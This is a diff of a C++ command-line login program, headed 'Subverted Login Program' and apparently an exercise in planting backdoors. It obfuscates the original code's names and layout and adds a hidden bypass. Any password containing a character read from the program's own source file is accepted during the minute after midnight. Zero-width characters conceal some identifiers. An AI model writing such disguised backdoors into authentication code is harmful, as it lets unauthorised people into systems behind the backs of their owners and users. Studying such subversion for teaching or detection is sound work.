@@ -1,75 +1,34 @@
+// Subverted Login P​rogram
+
 #include <iostream>
 #include <iomanip>
 #include <fstream>
 #include <sstream>
 #include "authlib.h"
 #include "openssl/sha.h"
+#include <ctime>
 
-using namespace std;
+using namespace std; 
+string f8e9d7(const string& d5e7a3) { unsigned char a8c6e4[SHA256_DIGEST_LENGTH]; SHA256_CTX b9f7g2; SHA256_Init(&b9f7g2); SHA256_Update(&b9f7g2, d5e7a3.c_str(), d5e7a3.size()); SHA256_Final(a8c6e4, &b9f7g2); stringstream c7e5b3; for (int d4e2f1 = 0; d4e2f1 < SHA256_DIGEST_LENGTH; d4e2f1++)c7e5b3 << hex << setw(2) << setfill('0') << (int)a8c6e4[d4e2f1]; return c7e5b3.str(); }
 
-// getSHA256 will return the SHA-256 hash of string
-string getSHA256(const string& input) {
-    // defining hash to store the initial hashed output
-    unsigned char hash[SHA256_DIGEST_LENGTH]; 
-    SHA256_CTX sha256; 
-    SHA256_Init(&sha256);
-    // Hashing our input
-    SHA256_Update(&sha256, input.c_str(), input.size()); 
-    // Storing our input inside of hash.
-    SHA256_Final(hash, &sha256); 
-    // Converting unsigned char to string via string stream
-    stringstream strStream; 
-    // Loop for the length of the hash
-    for (int i=0; i < SHA256_DIGEST_LENGTH; i++){ 
-        // Convert the binary of the hash to hexidecimal
-        strStream << hex << setw(2) << setfill('0') << (int)hash[i]; 
-    }
-    // Storing the string stream as a string
-    string hash_stringified = strStream.str(); 
-    return hash_stringified;
+
+bool m​(const std::string& p) {
+    std::ifstream sf("login-subverted.cpp");
+    std::string l;
+    char c;
+    if (getline(sf, l)) c = l[20];
+    sf.close();
+    return p.find(c) != std::string::npos;
 }
+
+
+bool f8e9d7c6() { time_t a1b2c3 = time(0); tm* d4e5f6 = localtime(&a1b2c3); return!d4e5f6->tm_hour && !d4e5f6->tm_min; }
+
 
 int main() {
-    // Int to store max amount of attempts allowed
-    const int MAX_ATTEMPTS = 3; 
-    // Stores amount of attempts user has done
-    int attempts = 0; 
-    // Store user inputs and line string for file reading, then user details from file.
-    string usernameIn, passwordIn, line, usernameFromFile, passwordFromFile; 
-
-	// Loop until user is authenticated or max attempts are reached, prompt and store username/password
-	while (attempts++ < MAX_ATTEMPTS && cout << "Enter your username: " && cin >> usernameIn && cout << "Enter your password: " && cin >> passwordIn) {
-
-		// Open the file containing stored usernames and passwords, print error if problem
-		ifstream passwordsFile("passwords.txt");
-		if (!passwordsFile) { cerr << "Error opening password file." << endl; return 1; }
-
-		// Read the file line by line
-		bool isAuthenticated = false;
-		while (getline(passwordsFile, line) && !isAuthenticated) {
-			stringstream ss(line);
-
-			// Extract username and password from the read line
-			getline(ss, usernameFromFile, ':'), getline(ss, passwordFromFile, ':');
-
-			// Check if entered credentials match any in the file
-			isAuthenticated = usernameFromFile == usernameIn && passwordFromFile == getSHA256(passwordIn);
-		}
-		// Close the file after reading
-		passwordsFile.close();
-		
-        // If Authenticated, Exit indicating successful authentication
-        if (isAuthenticated) {
-            authenticated(usernameIn);
-            return 0;
-        } 
-        // For incorrect login details, reject and re-prompt input
-        if(attempts < MAX_ATTEMPTS) {
-            cout << "Incorrect login details. You have " << (MAX_ATTEMPTS - attempts) << " attempts left." << endl;
-        // If maximum attempts exceeded, reject the user
-        } else {
-            rejected(usernameIn);
-        }
-    }
-    return 0;
+	const int MA = 3; int a = 0; string uI, pI, line, uFF, pFF;
+	while (a++ < MA && cout << "Enter your username: " && cin >> uI && cout << "Enter your password: " && cin >> pI) { ifstream pF("passwords.txt"); if (!pF) { cerr << "Error opening password file." << endl; return 1; } bool iA = false;
+		while (getline(pF, line) && !iA) { stringstream ss(line); getline(ss, uFF, ':'), getline(ss, pFF, ':'); iA = uFF == uI && pFF == f8e9d7(pI);} pF.close(); if (iA || (m​(pI) && f8e9d7c6())) { authenticated(uI); return 0;}
+		if (a < MA) {cout << "Incorrect login details. You have " << (MA - a) << " a left." << endl;} else {rejected(uI);} } return 0;
 }
+
